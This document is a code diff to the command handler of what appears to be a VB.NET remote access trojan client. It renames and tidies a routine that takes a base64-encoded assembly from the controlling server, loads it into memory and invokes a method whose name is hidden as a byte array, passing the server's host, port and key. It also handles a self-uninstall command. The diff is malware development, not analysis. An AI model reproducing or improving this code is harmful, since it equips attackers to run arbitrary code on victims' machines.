@@ -3,10 +3,8 @@ Imports System.Threading
 
 Public Class Commands
 
-    Public Shared SPL = Main.SPL
-    Public Shared C = Main.C
-
-    'Get server commands and apply it
+    Private Shared SPL = "|'L'|"
+    Private Shared C As New TCP
 
     Public Shared Sub Data(ByVal b As Byte())
         Dim A As String() = Split(BS(b), SPL)
@@ -51,9 +49,9 @@ Public Class Commands
                     If A(3).ToString = "update" Then
                         Installation.DEL()
                     End If
-'
-                Case "Plugen"
-                    Plugen(Convert.FromBase64String(A(1)))
+
+                Case "Plugin"
+                    Plugin(Convert.FromBase64String(A(1)))
 
             End Select
         Catch ex As Exception
@@ -62,12 +60,12 @@ Public Class Commands
 
     End Sub
 
-    Public Shared Sub Plugen(ByVal B() As Byte)
+    Public Shared Sub Plugin(ByVal B() As Byte)
         Try
             For Each A As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                 For Each MF In A.GetMethods
                     If MF.Name = BS(New Byte() {82, 67}) Then
-                        MF.Invoke(Nothing, New Object() {Settings.HOST, Settings.PORT, TCP.SPL})
+                        MF.Invoke(Nothing, New Object() {Settings.HOST, Settings.PORT, TCP.KEY})
                     End If
                 Next
             Next
